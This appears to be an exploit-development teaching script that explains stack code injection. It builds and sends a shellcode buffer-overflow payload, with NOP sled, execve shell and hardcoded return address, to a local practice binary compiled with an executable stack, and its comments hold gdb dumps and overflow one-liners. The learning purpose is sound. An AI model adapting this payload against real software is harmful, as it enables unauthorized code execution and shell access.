#!/usr/bin/python3
import sys
from subprocess import Popen, PIPE
import shlex
import struct

'''
TEACHING
Previously, we hijacked code flow but we're still limited to instructions that exist in original target program.
What if no 'spawn_shell()' was defined by target software ? how could we spawn a shell then ?
What if we want the target process to execute a custom program (our own set of instructions) ?
Can it execute our intentions ? Can we make it do things according to our will ?

For a process to execute any set of instructions, the instructions need to be present (or made available) inside
the process address space (i.e. instructions must be mapped to virtual memory allocated to the process).
Since our will (in the form of instructions) is NOT already present inside the target process address space, we
need to bring it in !

How can we do that ? 
This depends on WHAT the target program brings/allows inside its process address space. For this simple program,
it takes user-input string (from STDIN) and stores it into memory (in a local buffer on stack segment). Since, 
we have compiled this prgram such that its stack segment is executable (gcc -z execstack), we can smuggle/inject
our intentions (shellcode) via user-input and return execution flow (hijacked by overwriting return pointer) to
it.
This process (of bringing in code inside a process address space) is called as Code Injection and this type of 
attack is known as Code Injection Attack. Usually, we want to achieve the malicious Code Execution after Injection
which is being done (above) by 'overwriting saved return address'. This state is called ACE (Arbitrary Code 
Execution) and the target is a network program and user-input is being provided remotely, the state achieved by
an attacker is called RCE (Remote Code Execution) as the attacker is able to execute code on victim machine over
the network (remotely).

NOTE: The memory region we bring our shellcode in must be an executable region (nothing better than a RWX page)


Exploit Development on 
> x86-64 Arch => Linux kali 6.1.0-kali5-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.12-1kali2 (2023-02-23) x86_64 GNU/Linux
> ARM Arch => 

Triggering manual exploitation
$ ./003_auth_overflow2.elf $(python2 -c 'print "A"*40 + "\x76\x11\x40"')  
or,
$ ./exploit_005_auth_overflow2_shellcode_execution.py					# in case above does not work
$ ./003_auth_overflow2.elf $(cat ./malinput.e3.003_auth_overflow2)

STACK DIAGRAM for - int check_authentication(char *password)

        +------------+ <-- rbp-0x20
        |  password  |
        +------------+
		...					[40 bytes to corrupt saved RIP]
		...
        +------------+ <-- rbp-0x4
        |  auth_flag |
        +------------+ <-- rbp
        |  saved FP  |
        +------------+
        |  saved RIP |
        +------------+

(gdb) print spawn_shell
$1 = {void ()} 0x401176 <spawn_shell>

STACK state before ACID rain
(gdb) x/10xg $rsp
0x7fffffffdcd0: 0x0000000000000000      0x00007fffffffe1ea
0x7fffffffdce0: 0x0000000000000000      0x0000000000000000
0x7fffffffdcf0: 0x0000000000000000      0x0000000000000000
0x7fffffffdd00: 0x00007fffffffdd20      0x000000000040126c
0x7fffffffdd10: 0x00007fffffffde38      0x0000000200000000

STACK state after ACID rain
(gdb) x/10xg $rsp
0x7fffffffdcd0: 0x0000000000000000      0x00007fffffffe1ea
0x7fffffffdce0: 0x4141414141414141      0x4141414141414141
0x7fffffffdcf0: 0x4141414141414141      0x4141414141414141
0x7fffffffdd00: 0x4141414141414141      0x0000000000401176
0x7fffffffdd10: 0x00007fffffffde38      0x0000000200000000
(gdb) x/2xg $rbp
0x7fffffffdd00: 0x4141414141414141      0x0000000000401176
'''

target = "./003_auth_overflow2.elf"
shellcode = "./execve_binsh.raw"
fo = open(shellcode, 'rb')
shellcode = fo.read()
fo.close()

# CREATE payload
'''
Return pointer address varies INSIDE & OUTSIDE of GDB
GDB messes up with stack addresses by introducing environment variables - which are stored on stack segment. 

# INSIDE GDB, user-input buffer is allocated @ 0x7fffffffdce0.
(gdb) r $(python2 -c 'print "\x90"*30 + "\xcc"*10 + "\xe0\xdc\xff\xff\xff\x7f"')  

# NOTE: If you inject your shellcode in user-input buffer (allocated on stack), it can be a bit troublesome to
#		find the exact address to return to. Almost every time you compile your program from source, the 
#		user-input buffer seems to be located at different address. Finding shellcode address using CORE DUMPs
#		is decently reliable but I've seen it different/messed-up as well. Seems like we need to find a reliable
#		way to identify the return address (address of shellcode).
#
# OUTSIDE GDB, user-input buffer is allocated @ 0x7fffffffdd40 or 0x7fffffffdd30 (depending on compiler's mood).
# You can find it out by running the target with messed up return address and letting it SEGFAULT (dumping core),
# then debug the core in GDB (gdb -c corefile), now analyze the stack pointer and locate the user-buffer by
# finding your input - Wooooah you found the location to jump to !
# Alternatively, you can use ltrace also - to find out where strcpy(0x...., user-input) is trying to copy user
# input but this did not work out for me (not sure why!)
# Now, you can execute your shellcode x_x
$ ./003_auth_overflow2.elf $(python2 -c 'print "\x90"*30 + "\xcc"*10 + "\x40\xdd\xff\xff\xff\x7f"') 
'''
payload = bytearray()
payload = b"\x90"*10
payload += shellcode
payload += b"\x90"*(40-len(payload))
payload += b"\x30\xdd\xff\xff\xff\x7f"		# address of user-input buffer (outside GDB)
#payload += b"\x40\xdd\xff\xff\xff\x7f"		# address of user-input buffer (outside GDB)
#payload += b"\xe0\xdc\xff\xff\xff\x7f"		# address of user-input buffer (inside GDB)

print ("CREATED payload: ", end='')
print (payload)

# WRITE payload to DISK (useful to trigger manual exploitation)
filename = 'malinput.' + target[:-4].replace("./", "") + "." + sys.argv[0].replace("./", '')[:11]
fo = open( filename, 'wb')
fo.write(payload)
fo.close()
print ("WROTE payload to disk: " + filename)

# -x-x-x-x- SEND payload to vulnerable process -x-x-x-x-

print ("SENDING payload to target process: " + target)
print ()

# Send payload via CMD Line arguments
# AIM: $ cat | ./<target> <payload>
pivot = Popen("cat".split(), stdout=PIPE)					# 'cat' should take STDIN from terminal itself
pivot.wait()
p = Popen([target, bytes(payload)], stdin=pivot.stdout)		# 'target' should take STDIN from 'cat' prog's STDOUT
#p.wait()
# press Ctrl+d to terminate 'cat' process
#p = Popen([target, bytes(payload)])		# 'target' should take STDIN from 'cat' prog's STDOUT

'''
# Send payload via ENVIRONMENT variable
'''

'''
# Send payload via STDIN
p = Popen(shlex.split(target), stdin=PIPE)
p.stdin.write(payload)
p.stdin.flush()
'''
